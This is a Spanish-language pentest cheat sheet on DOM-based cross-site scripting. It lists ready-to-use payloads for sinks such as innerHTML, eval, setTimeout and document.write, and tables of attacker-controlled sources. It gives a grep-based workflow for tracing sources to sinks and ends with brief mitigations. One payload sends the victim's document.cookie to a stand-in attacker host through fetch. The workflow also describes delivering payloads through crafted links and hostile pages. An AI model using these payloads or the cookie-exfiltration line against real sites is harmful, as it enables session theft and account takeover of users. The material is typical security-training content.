---
aliases:
  - XSS Basado en DOM
tags:
  - type/technique
  - vuln/xss
  - technique/execution
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
kind: SubCheatSheet
linked:
  - '[[Cross-Site Scripting (XSS)]]'
---
# XSS - Manipulación de Sources y Sinks (DOM-based)

***

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `https://target/#<img src=x onerror=alert(1)>` | Fragment inyectado en `location.hash` → sink `innerHTML` | App lee `location.hash` y la renderiza con `.innerHTML`. |
| `https://target/?q=<svg onload=alert(1)>` | Search param leído por JS y volcado a innerHTML | Source = `location.search`, sink = `innerHTML`. |
| `https://target/#javascript:fetch('//attacker/?c='+document.cookie)` | XSS+exfil via fragment | App hace `window.location = location.hash`. |
| `<a href="https://target/#payload">click</a>` (en sitio atacante) | Setea `document.referrer` cuando víctima clickea | Sink lee referrer → innerHTML. |
| `window.name="alert(1)"; location='https://target/#sink'` | Payload masivo (≤2MB) en `window.name` cross-domain | Sink hace `eval(window.name)`. |
| `'-alert(1)-'` | Rompe string JS dentro de `eval('var u="'+input+'"')` | Sink `eval()` con concat de input. |
| `");alert(1);//` | Rompe sub-shell de `eval`/`Function` | Sink ejecuta string concatenado. |
| `1);alert(1);(1` | Rompe `setTimeout("log('"+input+"')", 1000)` | Sink `setTimeout` con string. |
| `</script><script>alert(1)</script>` | Rompe contexto `document.write` actual | Sink `document.write(input)`. |
| `<style onload=eval(name)>` | Style con onload + payload en `window.name` | Sink `innerHTML` con `<script>` bloqueado. |
^xss-sources

### Sources controlables (lee atacante)

| **Source** | **Cómo lo controlás** | **Notas** |
|:---:|:---:|:---:|
| `location.hash` | Fragment `#...` — NO se envía al server, evade WAF | Más usado. |
| `location.search` | Query string `?...` | Visible al server. |
| `location.pathname` | Path `/foo/bar` | Limitado por router. |
| `document.referrer` | URL del sitio que linkea | Requiere control de sitio que linkea. |
| `window.name` | Setea en tu sitio antes de redirigir | Sobrevive cross-domain. 2MB max. |
| `document.cookie` | Si podés setear cookie (subdomain takeover, prev XSS) | Persistente. |
| `localStorage` / `sessionStorage` | Si lograste write previo | Persistente. |
| `postMessage` | `targetWindow.postMessage(payload, '*')` | Cross-frame messaging. |
^xss-sources-sources

### Sinks vulnerables (escribe app)

| **Sink** | **Qué hace** | **Payload type** |
|:---:|:---:|:---:|
| `element.innerHTML = x` | Parsea HTML, ejecuta `<img onerror>` etc | HTML payload. |
| `element.outerHTML = x` | Idem innerHTML | HTML payload. |
| `document.write(x)` | Inyecta HTML directo | HTML payload — `<script>` ejecuta. |
| `eval(x)` | Ejecuta JS | JS code. |
| `Function(x)()` | Constructor + invoke | JS code. |
| `setTimeout(x, n)` / `setInterval(x, n)` | Si `x` es string, eval JS | JS code. |
| `element.src = x` (script/iframe) | Carga URL como código/HTML | `javascript:`/`data:` URI. |
| `element.href = x` (anchor) | Click ejecuta | `javascript:` URI. |
| `location = x` / `location.href = x` | Navega a URL | `javascript:` URI. |
| `Range.createContextualFragment(x)` | Parsea HTML | HTML payload. |
| `jQuery $(x)` | Si `x` empieza con `<`, parsea HTML | HTML payload. |
^xss-sources-sinks

### Workflow

```bash
# 1. Identificar source — grep el JS de la app
curl -s https://target/static/app.js | grep -E 'location\.(hash|search)|document\.(referrer|cookie)|window\.name'

# 2. Trazar el flow del input — DevTools → Sources tab → search variable name
# Setear breakpoint en cada uso

# 3. Identificar sink
grep -E 'innerHTML|document\.write|eval\(|setTimeout\(.*[\'"]|Function\(' app.js

# 4. Construir payload según sink
# Si innerHTML → HTML/event handler
# Si eval/setTimeout-string → JS directo

# 5. Triggerear via source
# Hash: enviar link https://target/#payload
# Referrer: hostear página que linkea con payload en URL
# window.name: redirigir desde tu sitio con window.name seteado

# 6. DOM Invader (Burp Pro) — auto-detect sources/sinks
# Burp → Extender → DOM Invader → habilitar
```

___

## Overview

**DOM XSS** = source (input atacante) → JS legítimo de la app → sink (función que ejecuta/renderiza) **todo en cliente**. No pasa por server → invisible para WAFs perimetrales y access logs.

**Identificación:** trazar de Source a Sink en el JS de la app. Tools: DOM Invader (Burp), grep manual, DevTools breakpoints.

**Mitigación:** sustituir `innerHTML`→`textContent`, eliminar `eval`/`Function`/`setTimeout`-string, validar/sanitizar en el flow source→sink, Trusted Types API.

***
